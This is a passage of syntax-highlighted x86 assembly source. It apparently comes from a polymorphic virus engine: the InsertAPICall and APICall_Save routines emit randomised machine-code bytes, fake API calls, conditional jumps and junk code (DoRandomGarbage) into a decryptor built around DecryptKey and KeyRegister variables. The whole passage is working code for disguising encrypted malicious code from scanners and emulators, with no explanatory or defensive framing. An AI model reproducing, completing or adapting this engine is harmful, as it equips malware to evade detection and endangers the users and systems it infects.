                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">APICall_StackOrder</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">APICall_SaveEAX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">APICall_SaveECX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">APICall_SaveEDX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DoRandomGarbage</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomCalling</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FirstAPICall</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Normal</span><span class="sc0">
       </span><span class="sc5">@@OtherRandom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FirstAPICall</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Continue1</span><span class="sc0">
          </span><span class="sc5">@@Normal</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Normal</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; *10h</span><span class="sc0">
     </span><span class="sc5">@@Continue1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc5">@@LoopSearch</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">APIInfo</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@APIFound</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">*</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@LoopSearch</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopSearch</span><span class="sc0">
   </span><span class="sc5">@@APIFound</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">APIInfo</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushParameter</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">APIInfo</span><span class="sc4">+</span><span class="sc2">09h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushParameter</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">APIInfo</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushParameter</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@WithAddition</span><span class="sc0">

       </span><span class="sc5">@@WithoutAddition</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15FFh</span><span class="sc0">   </span><span class="sc1">;; CALL DWORD PTR [xxx]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">APIInfo</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Continue</span><span class="sc0">

       </span><span class="sc5">@@WithAddition</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@WithoutAddition</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10FFh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">APIInfo</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@AddByte</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@AddByte</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Continue</span><span class="sc0">
        </span><span class="sc5">@@AddByte</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc5">@@Continue</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">APIInfo</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Check0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@CheckMinus1</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@NoCheck</span><span class="sc0">
      </span><span class="sc5">@@CheckBoolean</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Check0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MakeCondJump</span><span class="sc0">
      </span><span class="sc5">@@Check0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Check0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@OR</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@AND</span><span class="sc0">
       </span><span class="sc5">@@TEST</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C085h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MakeCondJump</span><span class="sc0">
       </span><span class="sc5">@@OR</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C009h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MakeCondJump</span><span class="sc0">
      </span><span class="sc5">@@AND</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C021h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MakeCondJump</span><span class="sc0">

      </span><span class="sc5">@@CheckMinus1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
      </span><span class="sc5">@@MakeCondJump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@@CJ_Again</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakeJZ</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">     </span><span class="sc1">; JNZ</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MakeJump</span><span class="sc0">
     </span><span class="sc5">@@MakeJZ</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0">     </span><span class="sc1">; JZ</span><span class="sc0">
   </span><span class="sc5">@@MakeJump</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">      </span><span class="sc1">; Leave space for the displacement</span><span class="sc0">
        </span><span class="sc5">@@CJ_Again3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel1Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Save the indexes of</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel2Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; the calls. If we have</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel3Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; to repeat the garbage</span><span class="sc0">
                                   </span><span class="sc1">; because it's too long, we have to restore</span><span class="sc0">
                                   </span><span class="sc1">; this to not set any inexistent CALL dis-</span><span class="sc0">
                                   </span><span class="sc1">; placement over other code that's not a</span><span class="sc0">
                                   </span><span class="sc1">; CALL</span><span class="sc0">
        </span><span class="sc5">@@CJ_Again2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">   </span><span class="sc1">; Save the actual storage index</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0"> </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">   </span><span class="sc1">; Get the (-)displacement of the jump</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CJ_Again2</span><span class="sc0">  </span><span class="sc1">; If it's zero, loop to make garbage</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; Calculate true displacement</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">   </span><span class="sc1">; Does it overpass the limit for displac.?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@CJ_OK</span><span class="sc0">      </span><span class="sc1">; If not, jump and continue</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel3Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Restore this, elimi-</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel2Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; nating any created</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel1Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; call before</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">   </span><span class="sc1">; Restore EDI...</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@CJ_Again3</span><span class="sc0">  </span><span class="sc1">; ...and repeat the garbage generation</span><span class="sc0">
               </span><span class="sc1">; Here if the size of the garbage is correct</span><span class="sc0">
       </span><span class="sc5">@@CJ_OK</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Release the data in stack</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; Put the displacement in AL</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">      </span><span class="sc1">; Calculate the distance until the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; Set the displacement in</span><span class="sc0">
                                                 </span><span class="sc1">; the opcode</span><span class="sc0">
      </span><span class="sc5">@@NoCheck</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">APICall_RestoreStack</span><span class="sc0">                

        </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImInAPI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">@@End2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">InsertAPICall</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">APICall_StackOrder</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">APICall_StackedRegs</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ImInAPI</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">AnyAPIFound</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FirstAPICall</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">APICall_SaveEAX</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">APICall_SaveReg_Common</span><span class="sc0">
</span><span class="sc5">APICall_SaveEAX</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">APICall_SaveECX</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">APICall_SaveReg_Common</span><span class="sc0">
</span><span class="sc5">APICall_SaveECX</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">APICall_SaveEDX</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc5">APICall_SaveReg_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SaveReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SaveReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NoRegister</span><span class="sc0">
         </span><span class="sc5">@@SaveReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">APICall_StackOrder</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">APICall_StackedRegs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">APICall_StackOrder</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPUSHReg</span><span class="sc0">
     </span><span class="sc5">@@NoRegister</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">APICall_SaveEDX</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

